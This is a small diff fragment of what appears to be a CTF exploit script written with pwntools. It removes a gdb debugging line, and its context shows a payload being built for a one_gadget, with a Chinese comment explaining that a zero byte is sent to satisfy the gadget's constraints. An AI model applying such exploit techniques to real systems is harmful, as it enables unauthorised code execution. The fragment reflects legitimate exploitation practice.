@@ -85,7 +85,6 @@ payload = flat(
     0,0,
     1
 )
-gdb.attach(r)
 
 r.sendlineafter(">","2")
 # 這邊payload 送 \x00 是因為one gadget 要求的參數剛好這邊要0
